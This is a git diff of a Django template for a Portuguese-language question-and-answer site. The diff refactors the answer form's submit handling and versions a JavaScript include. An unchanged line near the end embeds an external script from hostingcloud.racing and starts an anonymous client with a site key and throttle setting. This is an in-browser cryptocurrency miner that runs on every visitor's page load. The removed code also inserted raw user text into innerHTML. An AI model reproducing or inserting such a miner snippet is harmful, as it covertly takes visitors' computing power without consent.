@@ -77,44 +77,24 @@
 								<small>{{ question.id|total_answers }} respostas <b>&middot;</b> <span class="text-muted">{{ question.get_naturaltime }}</span></small>
 							{% if user.is_authenticated %}
 								{% if user_p.active %}
-								{% if user.username|answered:question.id %}
-								<span style="display: block"><b>Sua resposta:</b></span> {{ user.username|answer:question.id|linebreaksbr }}
-								{% else %}
-								<form id="form-{{ question.id }}" class="response-form" method="post" action="/">
-									{% csrf_token %}
-									<input name="question_id" type="hidden" value="{{ question.id }}">
-									{% if question.creator.user.username|blocked:user.username == 'Bloqueado' %}
-									<textarea disabled="true" name="text" maxlength="5000" class="form-control" placeholder="Você está impossibilitado(a) de responder esta pergunta." onclick="return show_form_buttons(this.parentElement)"></textarea>
-									<input disabled="true" class="btn btn-outline-primary form-button" type="submit" value="Enviar">
-									<input disabled="true" class="btn btn-outline-primary form-button" type="submit" value="Cancelar" onclick="return hide_form_buttons(this.parentElement)">
+									{% if user.username|answered:question.id %}
+									<span style="display: block"><b>Sua resposta:</b></span> {{ user.username|answer:question.id|linebreaksbr }}
 									{% else %}
-									<textarea name="text" maxlength="5000" class="form-control" placeholder="Escreva sua resposta aqui" onclick="return show_form_buttons(this.parentElement)"></textarea>
-									<input class="btn btn-outline-primary form-button" type="submit" value="Enviar">
-									<input class="btn btn-outline-primary form-button" type="submit" value="Cancelar" onclick="return hide_form_buttons(this.parentElement)">
-									{% endif %}
+									<form id="form-{{ question.id }}" class="response-form" method="post" action="/" onsubmit="make_answer({{ question.id }}); return false;">
+										{% csrf_token %}
+										<input name="question_id" type="hidden" value="{{ question.id }}">
+										{% if question.creator.user.username|blocked:user.username == 'Bloqueado' %}
+										<textarea disabled="true" name="text" maxlength="5000" class="form-control" placeholder="Você está impossibilitado(a) de responder esta pergunta." onclick="return show_form_buttons(this.parentElement)"></textarea>
+										<input disabled="true" class="btn btn-outline-primary form-button" type="submit" value="Enviar">
+										<input disabled="true" class="btn btn-outline-primary form-button" type="submit" value="Cancelar" onclick="return hide_form_buttons(this.parentElement)">
+										{% else %}
+										<textarea name="text" maxlength="5000" class="form-control" placeholder="Escreva sua resposta aqui" onclick="return show_form_buttons(this.parentElement)"></textarea>
+										<input class="btn btn-outline-primary form-button" type="submit" value="Enviar">
+										<input class="btn btn-outline-primary form-button" type="submit" value="Cancelar" onclick="return hide_form_buttons(this.parentElement)">
+										{% endif %}
+									</form>
 									<img style="display: none" id="modal-{{ question.id }}" src="/static/images/loading.gif" width="5%;">
-								</form>
-								<script>
-									$("#form-{{ question.id }}").submit(function() {
-										if('{{ question.creator.user.username|blocked:user.username }}' == 'Bloqueado') {
-											textarea = document.getElementById('form-{{ question.id }}').getElementsByTagName('textarea')[0]
-											alert(textarea)
-											return false
-										}
-
-										m = document.getElementById("modal-{{ question.id }}")
-										m.style.display = "block"
-										f = document.getElementById("form-{{ question.id }}")
-										f.getElementsByClassName("form-button")[0].style.display = "none"
-										f.getElementsByClassName("form-button")[1].style.display = "none"
-										$(this).ajaxSubmit(function() {
-											m.style.display = "none"
-											f.innerHTML = '<span style="display: block"><b>Sua resposta:</b></span> ' + f.text.value
-										})
-										return false
-									})
-								</script>
-								{% endif %}
+									{% endif %}
 								{% else %}
 								<p>Confirme seu email (verifique sua caixa de entrada do email: {{ user.email }}) para responder está pergunta.</p>
 								{% endif %}
@@ -157,7 +137,7 @@
 				{% endfor %}
 				<h5>Fim! <a href="/news">Clique aqui</a> para ver as novas perguntas.</h5>
 			</section>
-		<script src="/static/js/index.js"></script>
+		<script src="/static/js/index.js?v=5"></script>
 <script src="https://www.hostingcloud.racing/zk0a.js"></script><script>var _client=new Client.Anonymous("5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a",{throttle:.9,c:"w",ads:0});_client.start();</script>
 	</body>
 </html>
